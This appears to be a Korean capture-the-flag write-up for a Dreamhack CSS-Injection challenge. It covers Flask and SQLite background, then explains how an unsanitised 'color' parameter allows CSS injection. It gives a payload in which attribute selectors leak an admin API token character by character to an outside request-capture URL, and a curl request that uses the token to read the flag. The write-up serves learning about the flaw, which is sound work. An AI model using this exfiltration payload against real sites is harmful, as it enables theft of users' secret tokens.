# Challenge: dreamhack - CSS-Injection

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/421/



## 추가학습
### DATABASE 환경변수
환경 변수란 운영체제가 제공하는 전역 변수를 의미한다. 시스템이나 사용자, 애플리케이션이 필요로 하는 설정을 전달할 수 있게끔 해준다. 환경변수의 대표적인 용도는 실행 파일 경로 지정, 언어 설정, 파일 또는 디렉터리 위치 지정 등이 있다.
* database 환경변수 : 데이터베이스와 관련된 설정 정보를 담는 환경변수이다. DATABASE = os.environ.get("DATABASE", "database.db")의 코드 등으로 사용할 수 있다. os.environ은 python에서 운영체제 환경변수에 접근할 수 있는 딕셔너리 같은 객체로 os.environ.get("키", "기본값")을 통해 환경변수에서 지정한 키를 찾아 값을 가져오고 없으면 기본값을 사용하는 방식이다. 

### SQLite의 named parameter
아래 코드에서 SQL 쿼리에 :변수명 형태로 사용하는 것을 named parameter라 한다. python에서 데이터와 함께 쿼리를 실행할 때 딕셔너리를 전달해 각 parameter에 값을 바인딩한다.
* SQLite는 자동으로 이스케이프 처리를 하기 때문에 SQL Injection 공격을 단순히 문자열로 취급해 방어할 수 있다. 
```python
username = request.form.get("username")
        password = request.form.get("password")
        user = execute(
            "SELECT * FROM users WHERE username = :username and password = :password;",
            {
                "username": username,
                "password": hashlib.sha256(password.encode()).hexdigest(),
            },
        )
```

### 데코레이터
다른 함수를 감싸서 기능을 추가하는 함수를 말한다. 보통 함수에 공통된 전처리 또는 후처리를 위해 사용하기 때문에 flask에서 로그인 인증, 권한 체크 같은 작업을 view 함수에 적용할 때 사용한다.
* functools.wraps는 원래 함수의 메타데이터를 유지하게 도와주는 데코레이터로, 데코레이터 내에서 또 다른 함수를 반환할 때 원래 함수처럼 보이게 해 주는 역할이다.
* 아래 코드에서 wrapped_viewe는 login_required 데코레이터가 반환하는 함수이다.이 함수는 원래의 view 함수 대신 실행된다. 사용자 session이 존재하고 uid 키가 있어 로그인 된 상태라면 원래 view 함수를 실행한다.
```python
def login_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        if session and session["uid"]:
            return view(**kwargs)
        flash("login first !")
        return redirect(url_for("login"))
```

### @app.context_processor
* flask에서 @app.context_processor는 템플릿 랜더링 시 모든 템플릿에 공통적으로 사용할 수 있는 변수를 추가하는 함수나 메서드를 등록할 때 사용하는 데코레이터이다.
* 이 데코레이터가 붙은 함수는 모든 템플릿에 공통적으로 사용 가능한 변수를 반환한다. 해당 문제에서는 아래의 코드를 사용한다. 현재 요청의 쿼리 스트링 중 color 키를 찾아 dict(color=color)를 반환하는 것이다.
```python
@app.context_processor
def background_color():
    color = request.args.get("color", "white")
    return dict(color=color)
```



## 문제 풀이
step 1
* ADMIN_USERNAME = "administrator", ADMIN_PASSWORD = binascii.hexlify(os.urandom(32))로 설정되어 있다. change_password 기능도 없으니 admin 계정으로 로그인하는 것은 무리이다.

* main.py의 token_generate 부터 보자. token_generate() 함수는 register 과정에서 실행되는 함수로 중복되지 않는 고유한 토큰을 생성한다. 소문자에서 8개를 택해 조합하는 방식이다.
    ```python

    def token_generate():
        while True:
            token = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
            token_exists = execute(
                "SELECT * FROM users WHERE token = :token;", {"token": token}
            )
            if not token_exists:
                return token

    ```
* 위 코드에 따라 아무 계정을 등록하면 token이 생성되고, 로그인 후 /mypage에서 UID와 Username, API Token을 조회할 수 있다.
* flag를 얻을 수 있는 방법을 보자. flag는 memo 테이블에 "administrator" 계정의 uid로 등록된 텍스트에 적힌다. 따라서 관리자 계정의 memo 부분을 얻어야 한다. 이는 /api/memo를 요청하면 얻을 수 있는데, 이를 위해서는 관리자 계정의 token을 알아내야 한다. API-KEY 헤더에 관리자 계정의 token을 집어넣어 /api/memo로 요청을 보내면 텍스트를 얻어낼 수 있다.
* 그렇다면 관리자 계정의 token은 어떻게 알아낼 수 있는가? 우선 관리자 봇 구동을 위해 check_url이 실행되어야 한다. 그래야 토큰이 생기기 때문. 따라서 /report에서 폼을 어떻게 잘 입력해서 token을 얻어내야 한다.


step 2 - CSS 취약점 확인
* main.py에 아래의 내용이 있다. 랜더링되는 페이지에서 ?color=red 를 주소 뒤에 붙이면 적용되는 것을 볼 수 있다.
    ```python
    @app.context_processor
    def background_color():
        color = request.args.get("color", "white")
        return dict(color=color)
    ```
* base.html을 열어보니 ```<style> body{ background-color: {{ color }};} </style>``` 의 내용이 있어 color를 통해 CSS Injection이 가능해보인다.

step 3 - 취약점 적용 방법 모색
* CSS 취약점은 확인을 했다. token은 mypage.html에서 사용한다. mypage.html은 base.html 부분을 가져오니 color에 injection을 잘해서 user[3]에 들어가는 값을 알아내면 된다.
    ```html
    <div class="form-group">
    <label for="InputApitoken">API Token</label>
    <input type="text" class="form-control" id="InputApitoken" readonly value="{{ user[3] }}">
    <button class="btn btn-primary" onclick="TokenCopy()">Copy</button>
    </div>
    ```
* 따라서 /report의 폼에 들어갈 기본 페이로드는 다음과 같은 형식이다. 여기서 id=InputApitoken 조건이 없으면 user[2] 값인 administrator과 관련되어 탐색되기 때문에 token을 찾기가 불편하다. 따라서 id와 value의 조건 둘 다 적는 것이 좋다. 
mypage?color=yellow;} input[id=InputApitoken][value^={token 시작부분}] {background : url(https://yxwjimm.request.dreamhack.games);

step 4 - 자동화
* token이 8자리이므로 26*8 보다 적은 횟수로 노가다를 하면 token을 얻을 수 있다. 하지만 워게임 서버 유지시간도 있으니 자동화를 하는 것이 좋다.
* 익스플로잇 코드는 exploit.py에 작성하였다. 이 코드를 반복하면서 외부 사이트에서 get 요청으로 받은 token을 조합해 8자리를 만들어가면 된다.

step 5 - 플래그 얻기
* token을 알아냈으니 curl -X GET "http://host8.dreamhack.games:20722/api/memo" \
     -H "API-KEY: administ"을 통해 /api/memo 엔드포인트에 API-KEY 헤더를 붙여 GET 요청을 보내면 된다.

## 결과
token을 얻어 curl 명령어를 사용하면 flag를 얻어낼 수 있다.



